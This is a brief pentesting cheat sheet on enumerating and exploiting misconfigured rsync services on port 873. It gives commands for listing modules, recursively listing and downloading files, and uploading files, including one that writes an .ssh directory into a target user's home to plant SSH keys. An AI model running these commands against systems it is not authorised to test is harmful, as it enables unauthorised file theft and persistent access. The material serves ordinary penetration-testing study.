```markdown
# Rsync Enumeration & Exploitation
```
## Overview
- Rsync is a tool for performing transfer and sync between two servers.
- It is usually used on Linux systems.
- Sync is determined by checking the file sizes and timestamps.
- It is usually found running on **Port 873**.
- File Share Access can be defined in `/etc/rsyncd.conf` to provide anonymous or authenticated access.
- File Permissions can also be defined in `/etc/rsyncd.conf` by defining the user that the Rsync service will run as. If Rsync is configured to run as root, then anyone allowed to connect can access the shared files with the privileges of the root user.

## List Directory
```bash
rsync 127.0.0.1::
```

## List Sub Directory
```bash
rsync 127.0.0.1::files
```

## For detailed enumeration of a specific module to see files and permissions
```bash
rsync -av --list-only rsync://target_host/module_name
```

## List Directories & Files Recursively
```bash
rsync -r 127.0.0.1::files/tmp/
```

## Downloading Files & Folders
```bash
rsync -avz target_host::module_name /local/directory/
rsync 127.0.0.1::files/tmp/test.txt .
rsync -r 127.0.0.1::files/tmp
```

## Uploading Files & Folders
```bash
rsync -av home_user/.ssh/ rsync://user@target_host/home_user/.ssh
rsync ./file.txt 127.0.0.1::files/test
rsync -r ./folder 127.0.0.1:files/test
```

## More Interesting Enumeration Techniques
- https://blog.netspi.com/linux-hacking-case-studies-part-1-rsync/
- https://book.hacktricks.xyz/pentesting/873-pentesting-rsync#post
```
